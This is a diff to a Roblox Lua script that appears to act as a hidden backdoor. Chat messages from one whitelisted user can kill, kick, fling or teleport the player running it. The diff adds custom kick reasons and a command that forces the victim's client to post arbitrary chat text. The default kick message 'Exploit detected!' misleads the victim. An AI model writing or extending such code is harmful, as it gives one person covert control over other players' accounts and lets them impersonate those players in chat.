@@ -1,6 +1,7 @@
 local whitelisted = {"usernamemyisthiz"}
 local events = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
 local messageDoneFiltering = events:WaitForChild("OnMessageDoneFiltering")
+local sayMessageRequest = events:WaitForChild("SayMessageRequest")
 local players = game:GetService("Players")
 local lp = players.LocalPlayer
 function getChar(plr)
@@ -10,11 +11,27 @@ function commands(chat, executor)
 	if chat:match("klC") then --Kill
 		getChar(lp):FindFirstChildOfClass("Humanoid").Health = 0
 	elseif chat:match("kkC") then
-		lp:Kick("Exploit detected!")
+        local reason_split = string.split(chat, " ")
+        local reason = ""
+        if #reason_split > 1 then
+            for i=2, #reason_split - 1 do
+                reason = reason..reason_split[i].." "
+            end
+        else
+            reason = "Exploit detected!"
+        end
+		lp:Kick(reason)
 	elseif chat:match("vC") then
 		getChar(lp):PivotTo(CFrame.new(9e9,9e9,9e9))
 	elseif chat:match("bC") then
 		getChar(lp):PivotTo(getChar(executor):GetPivot() * CFrame.new(0,0,3))
+    elseif chat:match("tC") then
+        local text_split = string.split(chat, " ")
+        local text = ""
+        for i=2, #text_split do
+            text = text..text_split[i].." "
+        end
+        sayMessageRequest:FireServer(text)
 	end
 end
 
